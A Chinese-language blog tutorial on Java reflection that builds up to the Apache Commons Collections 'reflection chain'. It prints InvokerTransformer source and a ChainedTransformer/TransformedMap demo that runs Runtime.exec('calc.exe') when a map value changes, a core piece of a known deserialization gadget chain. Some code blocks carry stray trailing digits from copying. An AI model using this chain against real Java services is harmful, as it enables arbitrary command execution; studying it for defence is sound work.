**目录**

[什么是反射？](#t0)

[获取.class字节码文件对象](#t1)

[获取该.class字节码文件对象的详细信息](#t2)

[通过反射机制执行函数](#t3) 

[反射链](#t4)

* * *

[反射](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%B0%84&spm=1001.2101.3001.7020)机制是java的一个非常重要的机制，一些著名的应用框架都使用了此机制，如struts、spring、hibernate、android app界面等等。  
java.lang.Class它是java语法的一个基础类，用于描述一个class对象。在文件系统中，class以文件的形式存在。在运行的JVM中，\*.class文件被加载到内存中成为一个对象，该对象的类型就是java.lang.Class。

什么是反射？
------

在运行状态中，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取信息以及动态调用对象的方法的功能就称为**java语言的反射机制**。也就是说，虽然我们获取不到该类的源代码，但是通过该类的.class文件能反射(Reflect)出这些信息。

通俗点讲，通过反射，该类对我们来说是完全透明的，想要获取任何东西都可以。

想要使用反射机制，就必须要先获取到该类的[字节码](https://so.csdn.net/so/search?q=%E5%AD%97%E8%8A%82%E7%A0%81&spm=1001.2101.3001.7020)文件对象 .class，java.lang.Class类表示 .class 字节码文件对象。通过字节码文件对象，就能够通过该类中的方法获取到我们想要的所有信息(**方法、属性、类名、父类名、实现的所有接口等等**)，每一个类对应着一个字节码文件也就对应着一个Class类型的对象，也就是字节码文件对象。

### 获取.class字节码文件对象

获取字节码文件对象的三种方式，有了字节码文件对象才能获得类中所有的信息，我们在使用反射获取信息时，也要考虑使用下面哪种方式获取字节码对象合理，视不同情况而定。

```
//方法一      
Class clazz1 = Class.forName("my.Student");//通过Class类中的静态方法forName，直接获取到一个类的字节码文件对象，此时该类还是源文件阶段，并没有变为字节码文件。包名为 my，类名为 Student      
//方法二      
Class clazz2 = Student.class;  //当类被加载成.class文件时，此时Student.java类变成了Student.class，该类处于字节码阶段      
//方法三      
Student s=new Student();    //实例化Student对象      
Class clazz3 = s.getClass();　//通过该类的实例获取该类的字节码文件对象，该类处于创建对象阶段
```


### 获取该.class字节码文件对象的详细信息

当我们得到一个.class字节码文件对象，我们可以得到以下信息：

*   类名 (含package路径)
*   函数 (名称，参数类型，返回值）
*   域 （名称，类型）
*   实现的接口 (interfaces)

使用 java.lang.reflect.\*下的类来实现

```
import java.lang.reflect.Constructor;      
import java.lang.reflect.Method;      
import java.text.DateFormat.Field;       
public class main       
	public static void main(String[] args) throws Exception{      
		Object obj=new Student();  //Student实例      
		Class cls=obj.getClass();  //得到Student字节码对象       1
		//通过函数名和函数参数，得到函数      1
		String methodName="setId";           //函数名字      1
		Class[] par={int.class,String.class};  //函数参数      1
		Method m=cls.getMethod(methodName, par);   //返回函数      1
		//调用method      1
		Object[]  paramters={123,"haha"};   //传递参数      1
		m.invoke(obj,paramters);       //执行函数       1
		cls.getPackage();  //获取包信息      1
		String str=cls.getSimpleName();   //Student ，获得该类的名字，不包含包名      2
		String str2=cls.getName();       //my.Student，获得该类的名字，包含包名      2
		Object obj2=cls.newInstance();    //创建一个实例，要求有一个不带参数的构造函数       2
		int modified=cls.getModifiers();  //获取cls对象的类修饰符      2
		Class[] interfaces=cls.getInterfaces();  //获取实现的接口集合      2
		Constructor[]  con=cls.getConstructors();  //获取构造函数的集合      2
		Method[]  methods=cls.getMethods();  //获取函数列表      2
		cls.getDeclaredAnnotations();  //获取私有函数(protected和private修饰的)      2
		java.lang.reflect.Field[]  fields=cls.getFields();  //获取成员变量列表      2
		cls.getDeclaredField(str2);  //获取私有变量(protected和private修饰的)      2
	}      3
}
```


### 通过反射机制执行函数 

 如下，下面的代码中我们利用JAVA 的反射机制来调用计算器。我们利用了Java的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑。

```
import java.lang.reflect.InvocationTargetException;      
public class main3 {      
	public static void main(String[] args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException, ClassNotFoundException {      
	     Object runtime=Class.forName("java.lang.Runtime").getMethod("getRuntime",new Class[]{}).invoke(null); //得到Runtime.getRuntime()函数      
	     Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(runtime,"calc.exe");  //执行函数      
	}      
}
```


运行代码，可以看到，执行了 calc.exe 的命令 

![](https://img-blog.csdnimg.cn/20181218163541710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反射链

什么是**反射链**呢？

我们来查看 org.apache.commons.collections.functors.**InvokerTransformer.java** 的源代码，这个接口实现了反射链，可以通过Java的反射机制来执行任意命令

```
public class InvokerTransformer implements Transformer, Serializable {      
      /*      
          Input参数为要进行反射的对象，      
          iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型      
          iArgs为对应方法的参数      
          在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数          
    */      
    private static final long serialVersionUID = -8653385846894047688L;      
    private final String iMethodName;      1
    private final Class[] iParamTypes;      1
    private final Object[] iArgs;      1
    public static Transformer getInstance(String methodName) {      1
        if (methodName == null) {      1
            throw new IllegalArgumentException("The method to invoke must not be null");      1
        }      1
        return new InvokerTransformer(methodName);      1
    }      1
    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) {      1
        if (methodName == null) {      2
            throw new IllegalArgumentException("The method to invoke must not be null");      2
        }      2
        if (((paramTypes == null) && (args != null))      2
            || ((paramTypes != null) && (args == null))      2
            || ((paramTypes != null) && (args != null) && (paramTypes.length != args.length))) {      2
            throw new IllegalArgumentException("The parameter types must match the arguments");      2
        }      2
        if (paramTypes == null || paramTypes.length == 0) {      2
            return new InvokerTransformer(methodName);      2
        } else {      3
            paramTypes = (Class[]) paramTypes.clone();      3
            args = (Object[]) args.clone();      3
            return new InvokerTransformer(methodName, paramTypes, args);      3
        }      3
    }      3
    private InvokerTransformer(String methodName) {      3
        super();      3
        iMethodName = methodName;      3
        iParamTypes = null;      3
        iArgs = null;      4
    }      4
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {      4
        super();      4
        iMethodName = methodName;      4
        iParamTypes = paramTypes;      4
        iArgs = args;      4
    }      4
    public Object transform(Object input) {      4
        if (input == null) {      4
            return null;      5
        }      5
        try {      5
            Class cls = input.getClass();      5
            Method method = cls.getMethod(iMethodName, iParamTypes);      5
            return method.invoke(input, iArgs);           5
        } catch (NoSuchMethodException ex) {      5
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");      5
        } catch (IllegalAccessException ex) {      5
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");      5
        } catch (InvocationTargetException ex) {      6
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);      6
        }      6
    }      6
    private void writeObject(ObjectOutputStream os) throws IOException {      6
        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);      6
        os.defaultWriteObject();      6
    }      6
    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {      6
        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);      6
        is.defaultReadObject();      7
    }      7
}
```


然后，我们去实现这个接口，只需要传入方法名、参数类型和参数，即可调用任意函数。在这里，我们可以看到，先用ConstantTransformer() 获取了 Runtime 类，接着通过反射调用 getRuntime 函数，再调用 getRuntime 的 exec() 函数，执行命令。依次调用关系为： Runtime --> getRuntime --> exec()

```
import org.apache.commons.collections.Transformer;      
import org.apache.commons.collections.functors.ChainedTransformer;      
import org.apache.commons.collections.functors.ConstantTransformer;      
import org.apache.commons.collections.functors.InvokerTransformer;       
public class main2 {      
   public static void main(String[] args) {      
	 Transformer[] transformers=new Transformer[]{      
		new ConstantTransformer(Runtime.class),  //获得Runtime.class字节码文件      1
                //通过反射，返回一个对象      1
		new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),         1
		new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),      1
		new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})      1
		};      1
        //ChainedTransformer为链式的Transformer，会挨个执行我们定义Transformer      1
	Transformer transformedChain=new ChainedTransformer(transformers);      1
	Map innerMap=new HashMap();      1
	innerMap.put("value","value");      1
	Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);      2
	Map.Entry entry=(Entry)outerMap.entrySet().iterator().next();      2
	entry.setValue("test");  //修改值，触发执行      2
	}      2
}
```


可以看到，当`Map`中的Value值被修改了，触发执行了`Transformer的transform()方法，通过反射链调用了Runtime.getRuntime.exec("calc.exe") 命令`

![](https://img-blog.csdnimg.cn/20181219163537465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)